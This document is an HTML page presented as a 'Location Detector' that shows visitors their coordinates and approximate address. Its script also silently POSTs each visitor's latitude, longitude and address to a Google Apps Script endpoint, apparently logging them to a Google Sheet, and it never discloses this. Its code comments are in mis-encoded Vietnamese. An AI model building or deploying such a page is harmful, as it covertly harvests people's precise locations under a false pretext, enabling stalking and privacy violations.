<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Detector</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background: #0056b3; }
        #location { margin-top: 20px; padding: 10px; background: #f8f9fa; border-radius: 5px; }
        #error { color: red; }
    </style>
</head>
<body>
    <h1>Get Your Approximate Address</h1>
    <p>Click the button below to allow access to your location. This will show your coordinates and estimated address.</p>
    <button id="getLocation">Detect My Location</button>
    <div id="location"></div>
    <div id="error"></div>

    <script>
        const SCRIPT_URL = "PASTE_YOUR_WEB_APP_URL_HERE"; // <--- thay báº±ng link deploy Google Apps Script

        document.getElementById('getLocation').addEventListener('click', () => {
            const locationDiv = document.getElementById('location');
            const errorDiv = document.getElementById('error');
            locationDiv.innerHTML = '';
            errorDiv.innerHTML = '';

            if (!navigator.geolocation) {
                errorDiv.innerHTML = 'Geolocation is not supported by your browser.';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    locationDiv.innerHTML = `<strong>Coordinates:</strong> Latitude ${lat}, Longitude ${lon}<br>Fetching address...`;

                    try {
                        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
                        const response = await fetch(url);
                        const data = await response.json();

                        let address = data.display_name || "Address not available";
                        locationDiv.innerHTML += `<br><strong>Approximate Address:</strong> ${address}`;

                        // ðŸš€ Gá»­i dá»¯ liá»‡u lÃªn Google Sheet
                        await fetch(SCRIPT_URL, {
                            method: "POST",
                            body: JSON.stringify({ lat: lat, lon: lon, address: address })
                        });

                    } catch (err) {
                        locationDiv.innerHTML += '<br><strong>Address:</strong> Error fetching address.';
                    }
                },
                (error) => {
                    let errorMsg = 'Error getting location: ';
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg += 'Permission denied by user.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg += 'Location unavailable.';
                            break;
                        case error.TIMEOUT:
                            errorMsg += 'Request timed out.';
                            break;
                        default:
                            errorMsg += 'Unknown error.';
                    }
                    errorDiv.innerHTML = errorMsg;
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
            );
        });
    </script>
</body>
</html>
